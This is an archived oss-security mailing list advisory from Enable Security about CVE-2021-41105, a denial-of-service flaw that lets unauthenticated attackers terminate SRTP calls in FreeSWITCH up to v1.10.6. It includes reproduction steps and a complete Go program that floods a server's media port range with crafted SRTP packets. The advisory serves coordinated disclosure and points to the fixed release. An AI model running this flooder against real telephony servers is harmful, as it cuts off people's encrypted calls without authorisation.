X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4527" "Monday" "25" "October" "2021" "16:24:15" "+0200" "Sandro Gauci" "sandro@enablesecurity.com" nil "104" "[oss-security] [ES2021-09] FreeSWITCH susceptible to Denial of Service via invalid SRTP packets" nil nil nil "10" nil nil (number mark "U       sandro@enabl Oct 25  104/4527  " thread-indent "\"[oss-security] [ES2021-09] FreeSWITCH susceptible to Denial of Service via invalid SRTP packets\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [ES2021-09] FreeSWITCH susceptible to Denial of Service via invalid SRTP packets" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5514 invoked by uid 550); 25 Oct 2021 14:38:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29933 invoked from network); 25 Oct 2021 14:24:48 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=mime-version:message-id:date:from:to
	:subject:content-type; s=fm1; bh=HJZxOhYi/t0NSeIyz2M1I+7e7fiSmfm
	AdO4EfVsxo4w=; b=UNWnxRhghqBNqOEt33vutMeEx7f2wfRCGIsgai4nL01RzNz
	b/yv1aeIrGaTkfbMYrhREwkSMYTX4EulYiJrn+JJviS8VeTEjsosjpE0VaKE7XwW
	+PcTEg0VXLKmBvSXhRjkbahpp+XXtu5q+3CdsGHHJKhDixgwUC87SIkfez51Nh65
	Y9eViHxuaN1O+N+LHzWUv10Jptl9k8JSCHh9DiZnkVFnsX06LQc/aKrTz6elTuYw
	CeF1pYDjc4r2zrlEAq8XfFJLUo9zCoI1WLIxyzJfV4clgy4u9Ooq4MnbbOe6QYEt
	7Rsbv0qs0U9xsmfmBwLZ9+WLPkWgC43faeuTHKw==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=content-type:date:from:message-id
	:mime-version:subject:to:x-me-proxy:x-me-proxy:x-me-sender
	:x-me-sender:x-sasl-enc; s=fm1; bh=HJZxOhYi/t0NSeIyz2M1I+7e7fiSm
	fmAdO4EfVsxo4w=; b=JY8wyexzydqHb9bvIov+PNtm/9zg8xRdn6IXyGq37q+rX
	lapA9wt2QgGQ067Z4TLyx/x8JOQo1emIunDs1xbbAy1I+UoBYA8A9hcE2WnodYvx
	fQlzktdIO1p9VYJbcBKqm8/RcJnYXvgv/rv4BRdMyYRjvtpiFSD/1X/66WAe2rO8
	6LUcfWH//M4RIB5Gs6BMq9b68H7QJpx6TLeBLpYxVYIoRzU+RwwunO/aUqOhl3Ur
	FFRX9UTM25qYhVVisYDJnIsY4wZGcCpmP1HQeO8RT44DIQ0zd9V1WI3h+cBrB9XL
	O0OP5JeMbR4PkcNfFsZJVGtKjfUalsUOJsckEyIpw==
X-ME-Sender: <xms:JL52YZ1aGX9z8Hn5CESYTA4x4IzzyjdoSaigYoia3gBTuK6FXBIIeA>
    <xme:JL52YQG_5tt-i2bsGtNp1X-gN_CTSSnnhbTGgjGb5HVQmWJ5zoJxuGcX94iag6j-D
    Cg4Ef3PmLzhIJYw4g>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvtddrvdefhedgjeefucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtsehttdertd
    erredtnecuhfhrohhmpedfufgrnhgurhhoucfirghutghifdcuoehsrghnughrohesvghn
    rggslhgvshgvtghurhhithihrdgtohhmqeenucggtffrrghtthgvrhhnpeeuudefgeefue
    etvdejueeuuedtuedtkeetvdejfeduffegueffleehffeviefhteenucffohhmrghinhep
    ghhithhhuhgsrdgtohhmpdgvnhgrsghlvghsvggtuhhrihhthidrtghomhenucevlhhush
    htvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpehsrghnughrohesvghn
    rggslhgvshgvtghurhhithihrdgtohhm
X-ME-Proxy: <xmx:JL52YZ6RJtu3gH3lJaj2szqJIMwbBcP9AMZRZQp0okAESCCGnUGKwA>
    <xmx:JL52YW1gy3wt7Mrl8SEnsDnWleeA1jo1Vuti6Hz8llxBmVWy3PDTgQ>
    <xmx:JL52YcHA-YHQ-_s_PKyYjyqvp3Hb6NOc68hLj9eUyOHageclWKyYOw>
    <xmx:JL52YYiuRIv4P_iJYQFZTXTt_VvKZn6x47Fdot_2PGEQFlfbNxnkIQ>
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.5.0-alpha0-1369-gd055fb5e7c-fm-20211018.002-gd055fb5e
Mime-Version: 1.0
Message-Id: <192a3767-2dda-4156-b9bd-1f6a6fa56f3d@www.fastmail.com>
Date: Mon, 25 Oct 2021 16:24:15 +0200
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
 fulldisclosure@seclists.org, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
Content-Type: text/plain
Subject: [oss-security] [ES2021-09] FreeSWITCH susceptible to Denial of Service via invalid SRTP
 packets

# FreeSWITCH susceptible to Denial of Service via invalid SRTP packets

- Fixed versions: v1.10.7
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-09-freeswitch-srtp-dos
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-jh42-prph-gp36
- Other references: CVE-2021-41105
- Tested vulnerable versions: <= v1.10.6
- Timeline:
	- Report date: 2021-09-06
	- Triaged: 2021-09-10
	- Fix provided for testing: 2021-09-17
	- Vendor release with fix: 2021-10-24
	- Enable Security advisory: 2021-10-25

## TL;DR

When handling SRTP calls, FreeSWITCH is susceptible to a DoS where calls can be terminated by remote attackers. This attack can be done continuously, thus denying encrypted calls during the attack.

## Description

When a media port that is handling SRTP traffic is flooded with a specially crafted SRTP packet, the call is terminated leading to denial of service. This issue was reproduced when using the SDES key exchange mechanism in a SIP environment as well as when using the DTLS key exchange mechanism in a WebRTC environment.

The call disconnection occurs due to line 6331 in the source file `switch_rtp.c`, which disconnects the call when the total number of SRTP errors reach a hard-coded threshold (100):

```c
if (errs >= MAX_SRTP_ERRS) {
    // ...
    switch_channel_hangup(channel, SWITCH_CAUSE_SRTP_READ_ERROR);
}
```

## Impact

By abusing this vulnerability, an attacker is able to disconnect any ongoing calls that are using SRTP. The attack does not require authentication or any special foothold in the caller's or the callee's network.

## How to reproduce the issue

1. Prepare a FreeSWITCH instance that is publicly available and that can handle SRTP calls (`<X-PRE-PROCESS cmd="set" data="rtp_secure_media=true"/>`)
2. Prepare two SIP clients that can handle SRTP communication, such as Zoiper, and register against the FreeSWITCH instance
3. Prepare an attacker machine which has a different IP than that of the caller, callee or the FreeSWITCH instance
4. Save the below Go code and compile the application, naming it `freeswitch-srtp-dos`
5. Copy `freeswitch-srtp-dos` to the attacker machine
6. Perform a call between the agents using SRTP
7. Run the `freeswitch-srtp-dos` application against the target FreeSWITCH server: `./freeswitch-srtp-dos -ip <freeswitch_ip>`
8. Observe that when the active media ports are reached, FreeSWITCH will report "SRTP audio unprotect failed with code 21" multiple times, until the call is terminated

```go
package main

import (
	"flag"
	"fmt"
	"net"
)

func main() {
	var minport, maxport, count int
	var ip string

	flag.IntVar(&minport, "min-port", 16384, "port-range minimum value")
	flag.IntVar(&maxport, "max-port", 32768, "port-range maximum value")
	flag.IntVar(&count, "count", 200, "packet count per port")
	flag.StringVar(&ip, "ip", "", "target IPv4 address")
	flag.Parse()

	listener, err := net.ListenPacket("udp", "0.0.0.0:0")
	if err != nil {
		panic(err)
	}

	fmt.Printf("sending %d packets on each port, port range %d-%d\n",
		count, minport, maxport)

	addr := &net.UDPAddr{IP: net.ParseIP(ip)}
	for i := minport; i < maxport+1; i++ {
		fmt.Printf("\rattacking port: %d", i)
		addr.Port = i
		for j := 0; j < count; j++ {
			listener.WriteTo([]byte("\x80\x00p(\t\xcd-\x15\xfd>\\\x86A"), addr)
		}
	}
}
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

> Instead of disconnecting the call, FreeSWITCH should simply ignore packets that fail message authentication or replay checks.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

